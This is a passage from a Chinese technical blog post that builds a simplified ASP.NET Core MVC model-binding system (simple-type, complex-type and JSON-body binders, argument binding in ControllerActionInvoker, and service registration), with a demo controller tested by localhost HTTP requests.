&lt;p&gt;虽然真正的MVC框架支持包括数组、集合和字典类型的大部分数据类型的绑定，但我们的模拟框架只关注单纯的简单类型（Simple Type）和复杂类型（Complex Type）的绑定，不支持针对数组、集合和字典等类型的绑定。针对简单类型的模型绑定实现在如下这个SimpleModelBinder类型中。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; SimpleTypeModelBinder : IModelBinder
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Task BindAsync(ModelBindingContext context)
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (context.ValueProvider.TryGetValues(context.ModelName, &lt;span&gt;out&lt;/span&gt; &lt;span&gt;var&lt;/span&gt;&lt;span&gt; values))
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; model =&lt;span&gt; Convert.ChangeType(values.Last(), context.ModelMetadata.ModelType);
            context.Bind(model);
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Task.CompletedTask;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如上面的代码片段所示，在实现的BindAsync方法中，我们从表示绑定上下文的ModelBindingContext对象中得到用来提供原子数据项的IValueProvider对象，并将ModelName属性表示的模型名称作为参数调用该对象的TryGetValues方法。如果成功获得对应的数据项，我们只需要将以字符串形式表示的原始值（如果有多个，取最后一个）直接转换成目标类型，并调用ModelBindingContext上下文的Bind方法完成绑定即可。&lt;/p&gt;
&lt;p&gt;如下所示的SimpleTypeModelBinderProvider是SimpleTypeModelBinder对应的IModelBinderProvider实现类型。如果代码片段所示，在实现的GetBinder方法中，如果通过提供的模型元数据判断待绑定的目标类型支持源自字符串的类型转换，它会直接返回一个创建的SimpleTypeModelBinder对象，否则方法会返回Null。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; SimpleTypeModelBinderProvider : IModelBinderProvider
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IModelBinder GetBinder(ModelMetadata metadata) =&amp;gt; metadata.CanConvertFromString ? &lt;span&gt;new&lt;/span&gt; SimpleTypeModelBinder() : &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;一般来说，模型绑定的复杂类型就是具有属性成员的复合类型（如果我们为该类型定义了源自字符串类型的TypeConverter，该类型会变成简单类型）。针对复杂类型的绑定主要有两种形式，一种先是创建一个空对象并以递归的形式绑定其属性成员，另一种是直接提取请求主体承载的内容（比如JSON或者XML片段）采用反序列化的方式生成目标对象。&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;针对属性成员的递归绑定&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;如果采用针对属性成员的递归绑定方式，绑定的目标对象实际上是通过IValueProvider对象提供的多个原子数据项组合而成，那么先择需要解决的是原子数据项的名称与复杂数据对象的属性成员的映射关系。如果将属性表示成一条分支，任何一个复合对象都可以描述成一棵树，这棵树的叶子节点均为支持源自字符串类型转换的简单类型。要绑定为一个复杂对象，需要提供绑定为叶子节点所需的数据项。由于每个叶子节点的路径具有唯一性，如果将此路径来命名数据项，那么数据项与叶子节点就能对应起来。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Foobarbaz
{ 
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Foobar Foobar { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; Baz { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Foobar
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;  Foo { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;  Bar { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;举一个例子，假设绑定的目标类型为具有如上定义的Foobarbaz，它定义了两个属性Foobar和Baz。Baz属性的类型为double，所以是一个简单类型。Foobar属性为复杂类型Foobar，又包含两个简单类型的属性（Foo和Bar）。那么一个Foobarbaz对象可以表示为一棵如下图所示的树。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://img2020.cnblogs.com/blog/19327/202003/19327-20200330203641780-892509768.png&quot;&gt;&lt;img width=&quot;189&quot; height=&quot;195&quot; title=&quot;5-4&quot; alt=&quot;5-4&quot; src=&quot;https://img2020.cnblogs.com/blog/19327/202003/19327-20200330203643936-616814969.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果我们利用一个IValueProvider对象来提供一个完整的Foobarbaz对象，只需要提供绑定三个叶子节点所需的数据项，我们可以采用如下所示的方式利用叶子节点的路径作为数据项的名称。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;Key        Value
&lt;/span&gt;-------------------&lt;span&gt;
Foobar.Foo    &lt;/span&gt;&lt;span&gt;123&lt;/span&gt;&lt;span&gt;
Foobar.Bar    &lt;/span&gt;&lt;span&gt;456&lt;/span&gt;&lt;span&gt;
Baz           &lt;/span&gt;&lt;span&gt;789&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果目标Action方法具有两个类型均为Foobarbaz的参数（value1和value2），如果IValueProvider对象只提供上述的数据项，那么绑定的两个参数将承载完全相同的数据。如果对具体的参数进行针对性的绑定，可以将采用如下的方式以参数名作为前缀。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;Key            Value
&lt;/span&gt;-------------------------&lt;span&gt;
value1.Foobar.Foo    &lt;/span&gt;&lt;span&gt;111&lt;/span&gt;&lt;span&gt;
value1.Foobar.Bar    &lt;/span&gt;&lt;span&gt;111&lt;/span&gt;&lt;span&gt;
value1.Baz           &lt;/span&gt;&lt;span&gt;111&lt;/span&gt;&lt;span&gt;

value2.Foobar.Foo    &lt;/span&gt;&lt;span&gt;222&lt;/span&gt;&lt;span&gt;
value2.Foobar.Bar    &lt;/span&gt;&lt;span&gt;222&lt;/span&gt;&lt;span&gt;
value2.Baz           &lt;/span&gt;&lt;span&gt;222&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;针对复杂类型的第一种模型绑定方式通过如下这个ComplexTypeModelBinder类型来完成。正如前面提到过的，在实现的BindAsync方法中，ComplexTypeModelBinder对象会从模型元数据中得到待绑定的目标类型，并通过反射的方式创建一个空的对象。接下来，它会遍历每一个支持赋值的属性，并递归地采用模型绑定得到对应属性值，并对属性予以赋值。BindAsync最终会将之前创建的对象作为绑定的目标对象。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ComplexTypeModelBinder : IModelBinder
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt;&lt;span&gt; Task BindAsync(ModelBindingContext context)
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; metadata =&lt;span&gt; context.ModelMetadata;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; model =&lt;span&gt; Activator.CreateInstance(metadata.ModelType);
        &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; property &lt;span&gt;in&lt;/span&gt; metadata.ModelType.GetProperties().Where(it =&amp;gt; it.SetMethod != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;))
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; binderFactory = context.ActionContext.HttpContext.RequestServices.GetRequiredService&amp;lt;IModelBinderFactory&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; propertyMetadata =&lt;span&gt; ModelMetadata.CreateByProperty(property);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; binder =&lt;span&gt; binderFactory.CreateBinder(propertyMetadata);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; modelName = &lt;span&gt;string&lt;/span&gt;&lt;span&gt;.IsNullOrWhiteSpace(context.ModelName)
                &lt;/span&gt;?&lt;span&gt; property.Name
                : $&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{context.ModelName}.{property.Name}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; propertyContext = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ModelBindingContext(context.ActionContext, modelName, propertyMetadata, context.ValueProvider);
            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; binder.BindAsync(propertyContext);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (propertyContext.IsModelSet)
            {
                property.SetValue(model, propertyContext.Model);
            }
        }
        context.Bind(model);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在针对每个属性的模型绑定实施过程中，ComplexTypeModelBinder对象会利用针对当前请求的IServiceProvider对象得到注册的IModelBinderFactory对象，然后根据当前属性创建创建一个描述模型元数据的ModelMetadata对象，并将其作为参数调用IModelBinderFactory对象的CreateBinder方法得到用来绑定当前属性的IModelBinder对象。ComplexTypeModelBinder随后会创建作为绑定上下文的ModelBindingContext对象，当前上下文的ModelName属性附加上当前属性名之后会作为新创建上下文的ModelName属性。ComplexTypeModelBinder最后会将此上下文作为参数调用IModelBinder对象的BindAsync方法完成针对当前属性的模型绑定。&lt;/p&gt;
&lt;p&gt;ComplexTypeModelBinder将作为复杂类型的默认IModelBinder类型。如果希望采用基于反序列化的绑定方式，模拟框架假设对应的参数上会显式标注FromBodyAttribute特性。所以ComplexTypeModelBinderProvider会采用如下的方式来提供ComplexTypeModelBinder对象。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ComplexTypeModelBinderProvider : IModelBinderProvider
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; IModelBinder GetBinder(ModelMetadata metadata)
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (metadata.CanConvertFromString)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; metadata.Parameter?.GetCustomAttribute&amp;lt;FromBodyAttribute&amp;gt;() == &lt;span&gt;null&lt;/span&gt;
            ? &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ComplexTypeModelBinder()
            : &lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;span&gt;针对反序列化的绑定&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;如果希望通过反序列化请求主体内容的方式来绑定复杂类型参数，我们可以采用如下这个BodyModelBinder类型。简单起见，在实现的BindAsync方法中，我们只实现了针对JSON的反序列化。BodyModelBinder对象由如下所示的BodyModelBinderProvider类型提供。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; BodyModelBinder : IModelBinder
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt;&lt;span&gt; Task BindAsync(ModelBindingContext context)
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; input =&lt;span&gt; context.ActionContext.HttpContext.Request.Body;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; result = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; JsonSerializer.DeserializeAsync(input, context.ModelMetadata.ModelType);
        context.Bind(result);
    }
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; BodyModelBinderProvider : IModelBinderProvider
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; IModelBinder GetBinder(ModelMetadata metadata)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; metadata.Parameter?.GetCustomAttribute&amp;lt;FromBodyAttribute&amp;gt;() == &lt;span&gt;null&lt;/span&gt;
            ? &lt;span&gt;null&lt;/span&gt;&lt;span&gt;
            : &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; BodyModelBinder();                
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;当目前位置，我们已经完成了所有模型绑定的所需的工作，接下来我们将基于模型绑定的参数绑定实现在ControllerActionInvoker之中，为此我们定义了在该类型中定义了如下这个BindArgumentsAsync方法，该方法会返回指定Action方法的参数列表。如下面的代码片段所示，如果目标方法没有参数，BindArgumentsAsync方法只需要返回一个空的对象数组。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ControllerActionInvoker : IActionInvoker
{   
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;&lt;span&gt;object&lt;/span&gt;[]&amp;gt;&lt;span&gt; BindArgumentsAsync(MethodInfo methodInfo)
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; parameters =&lt;span&gt; methodInfo.GetParameters();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (parameters.Length == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;];
        }
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; arguments = &lt;span&gt;new&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;&lt;span&gt;[parameters.Length];
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; index = &lt;span&gt;0&lt;/span&gt;; index &amp;lt; arguments.Length; index++&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; parameter =&lt;span&gt; parameters[index];
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; metadata =&lt;span&gt; ModelMetadata.CreateByParameter(parameter);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; requestServices =&lt;span&gt; ActionContext.HttpContext.RequestServices;
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; valueProviderFactories = requestServices.GetServices&amp;lt;IValueProviderFactory&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; valueProvider = &lt;span&gt;new&lt;/span&gt; CompositeValueProvider(valueProviderFactories.Select(it =&amp;gt;&lt;span&gt; it.CreateValueProvider(ActionContext))); 
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; modelBinderFactory = requestServices.GetRequiredService&amp;lt;IModelBinderFactory&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; context =&lt;span&gt; valueProvider.ContainsPrefix(parameter.Name)
                &lt;/span&gt;? &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ModelBindingContext(ActionContext, parameter.Name, metadata, valueProvider)
                : &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; ModelBindingContext(ActionContext, &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;, metadata, valueProvider);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; binder =&lt;span&gt; modelBinderFactory.CreateBinder(metadata);
            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; binder.BindAsync(context);
            arguments[index] &lt;/span&gt;=&lt;span&gt; context.Model;
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; arguments;
    }
    …
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果目标Action方法定义了参数，BindArgumentsAsync方法会为针对每个参数采用模型绑定的方式得到对应的参数值。具体来说，BindArgumentsAsync方法会利用根据当前参数创建描述目标模型元数据的ModelMetadata对象。接下来，该方法针对当前请求的IServiceProvider对象得到当前注册的所有IValueProviderFactory对象，并利用它们提供的IValueProvider对象创建一个CompositeValueProvider对象。接下来，该方法再次利用同一个IServiceProvider对象得到注册的IModelBinderFactory对象，并利用它根据模型元数据得到实施模型绑定的IModelBinder对象。&lt;/p&gt;
&lt;p&gt;BindArgumentsAsync方法会根据当前的ActionContext上下文和预先创建的ModelMetadata对象、CompositeValueProvider对象创建出代表绑定上下文的ModelBindingContext对象。如果CompositeValueProvider对象能够提供参数名称作为名称前缀的数据项，那么参数名称将作为ModelBindingContext对象的ModelName属性，否则该属性将设置为空字符串。针对ModelName属性的命名规则确保数据源通过将参数名称作为前缀实现针对具体某个参数的绑定，也可以不用指定这个前缀绑定所有参数。BindArgumentsAsync最终将这个绑定上下文作为调用IModelBinder对象的BindAsync方法，并通过上下文的Model属性得到绑定的参数值。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ControllerActionInvoker : IActionInvoker
{    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt;&lt;span&gt; Task InvokeAsync()
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; actionDescriptor =&lt;span&gt;  (ControllerActionDescriptor)ActionContext.ActionDescriptor;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; controllerType =&lt;span&gt; actionDescriptor.ControllerType;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; requestServies =&lt;span&gt; ActionContext.HttpContext.RequestServices;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; controllerInstance =&lt;span&gt; ActivatorUtilities.CreateInstance(requestServies, controllerType);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (controllerInstance &lt;span&gt;is&lt;/span&gt;&lt;span&gt; Controller controller)
        {
            controller.ActionContext &lt;/span&gt;=&lt;span&gt; ActionContext;
        }
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; actionMethod =&lt;span&gt; actionDescriptor.Method;
       &lt;strong&gt; &lt;/strong&gt;&lt;/span&gt;&lt;strong&gt;&lt;span&gt;var&lt;/span&gt; arguments = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; BindArgumentsAsync(actionMethod);
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; returnValue =&lt;/strong&gt;&lt;span&gt;&lt;strong&gt; actionMethod.Invoke(controllerInstance, arguments);&lt;/strong&gt;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; mapper = requestServies.GetRequiredService&amp;lt;IActionResultTypeMapper&amp;gt;&lt;span&gt;();
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; actionResult = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; ToActionResultAsync(returnValue, actionMethod.ReturnType, mapper);
        &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; actionResult.ExecuteResultAsync(ActionContext);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在用于执行目标Action的InvokeAsync方法中，我们在通过描述Action的ControllerActionDescriptor对象得到表示目标Action方法的MethodInfo对象之后，我们将其作为参数调用了上面定义的BindArgumentsAsync方法得到待执行方法的参数列表，并最终以反射的方式执行目标Action方法。&lt;/p&gt;
&lt;p&gt;由于针对模型绑定的所有服务对象都是利用依赖注入容器获取的，所以我们需要作相应的服务注册。在前面定义的针对IServiceCollection接口的AddMvcControllers扩展方法中，我们采用如下的方式分别完成了针对IValueProviderFactory、IModelBinderFactory和IModelBinderProvider的服务注册。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ServiceCollectionExtensions
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; IServiceCollection AddMvcControllers(&lt;span&gt;this&lt;/span&gt;&lt;span&gt; IServiceCollection services)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; services
            .AddSingleton&lt;/span&gt;&amp;lt;IActionDescriptorCollectionProvider, DefaultActionDescriptorCollectionProvider&amp;gt;&lt;span&gt;()
            .AddSingleton&lt;/span&gt;&amp;lt;IActionInvokerFactory, ActionInvokerFactory&amp;gt;&lt;span&gt;()
            .AddSingleton&lt;/span&gt;&amp;lt;IActionDescriptorProvider, ControllerActionDescriptorProvider&amp;gt;&lt;span&gt;()
            .AddSingleton&lt;/span&gt;&amp;lt;ControllerActionEndpointDataSource,ControllerActionEndpointDataSource&amp;gt;&lt;span&gt;()
            .AddSingleton&lt;/span&gt;&amp;lt;IActionResultTypeMapper, ActionResultTypeMapper&amp;gt;&lt;span&gt;()

         &lt;strong&gt;   .AddSingleton&lt;/strong&gt;&lt;/span&gt;&lt;strong&gt;&amp;lt;IValueProviderFactory, HttpHeaderValueProviderFactory&amp;gt;&lt;span&gt;()
            .AddSingleton&lt;/span&gt;&amp;lt;IValueProviderFactory, QueryStringValueProviderFactory&amp;gt;&lt;span&gt;()
            .AddSingleton&lt;/span&gt;&amp;lt;IValueProviderFactory, FormValueProviderFactory&amp;gt;&lt;span&gt;()
            .AddSingleton&lt;/span&gt;&amp;lt;IModelBinderFactory, ModelBinderFactory&amp;gt;&lt;span&gt;()
            .AddSingleton&lt;/span&gt;&amp;lt;IModelBinderProvider, SimpleTypeModelBinderProvider&amp;gt;&lt;span&gt;()
            .AddSingleton&lt;/span&gt;&amp;lt;IModelBinderProvider, ComplexTypeModelBinderProvider&amp;gt;&lt;span&gt;()
            .AddSingleton&lt;/span&gt;&amp;lt;IModelBinderProvider, BodyModelBinderProvider&amp;gt;&lt;/strong&gt;&lt;span&gt;&lt;strong&gt;();&lt;/strong&gt;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;为了演示ControllerActionInvoker基于模型绑定的参数绑定机制，我们在前面演示的应用程序中定义了如下这个HomeController类型。我们在该Controller类型中定义了三个返回类型为字符串的Action方法（Action1、Action2和Action3）。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HomeController
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; JsonSerializerOptions _options = &lt;span&gt;new&lt;/span&gt; JsonSerializerOptions { WriteIndented = &lt;span&gt;true&lt;/span&gt;&lt;span&gt; };
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Action1(&lt;span&gt;string&lt;/span&gt; foo, &lt;span&gt;int&lt;/span&gt; bar, &lt;span&gt;double&lt;/span&gt; baz) =&amp;gt; JsonSerializer.Serialize(&lt;span&gt;new&lt;/span&gt; { Foo = foo, Bar = bar, Baz =&lt;span&gt; baz }, _options);
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Action2(Foobarbaz value1, Foobarbaz value2) =&amp;gt; JsonSerializer.Serialize(&lt;span&gt;new&lt;/span&gt; { Value1 = value1, Value2 =&lt;span&gt; value2 }, _options);
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Action3(Foobarbaz value1,&lt;strong&gt; [FromBody]&lt;/strong&gt;Foobarbaz value2) =&amp;gt; JsonSerializer.Serialize(&lt;span&gt;new&lt;/span&gt; { Value1 = value1, Value2 =&lt;span&gt; value2 }, _options);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Action1方法定义了三个简单类型的参数（foo、bar和baz），而Action2和 Action3方法定义了Foobarbaz类型（具有如下定义）参数（value1和value2），其中Action3方法的value2参数上标注了FromBodyAttribute特性。为了三个Action方法的输入参数是否正常绑定，我们将它们组合成一个元组，元组序列化生成的JSON字符串作为方法的返回值。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Foobarbaz
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Foobar Foobar { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; Baz { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Foobar
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Foo { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;  Bar { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们先来验证针对Action1方法的参数绑定。由于上面定义的针对IServiceCollection接口的AddMvcControllers扩展方法中注册了三种针对IValueProviderFactory接口的实现类型（QueryStringValueProviderFactory、HttpHeaderValueProviderFactory和FormValueProviderFactory），意味着我们可以分别采用请求的查询字符串、首部集合和提交的表单来提供待绑定参数的数据。为了验证这三种不同的数据来源，我们利用Fiddler针对Action1（/home/action1）发送了三个请求，从返回的响应可以看出该方法的三个参数均绑定了正确的数值。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
GET http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;localhost:5000/home/action1?foo=123&amp;amp;bar=456&amp;amp;baz=789 HTTP/1.1&lt;/span&gt;
User-&lt;span&gt;Agent: Fiddler
Host: localhost:&lt;/span&gt;&lt;span&gt;5000&lt;/span&gt;&lt;span&gt;

HTTP&lt;/span&gt;/&lt;span&gt;1.1&lt;/span&gt; &lt;span&gt;200&lt;/span&gt;&lt;span&gt; OK
Date: Fri, &lt;/span&gt;&lt;span&gt;14&lt;/span&gt; Feb &lt;span&gt;2020&lt;/span&gt; &lt;span&gt;02&lt;/span&gt;:&lt;span&gt;14&lt;/span&gt;:&lt;span&gt;58&lt;/span&gt;&lt;span&gt; GMT
Content&lt;/span&gt;-Type: text/&lt;span&gt;plain
Server: Kestrel
Content&lt;/span&gt;-Length: &lt;span&gt;50&lt;/span&gt;&lt;span&gt;

{
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;123&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;456&lt;/span&gt;&lt;span&gt;,
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Baz&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;789&lt;/span&gt;&lt;span&gt;
}


GET http:&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;localhost:5000/home/action1 HTTP/1.1&lt;/span&gt;
Foo: &lt;span&gt;123&lt;/span&gt;&lt;span&gt;
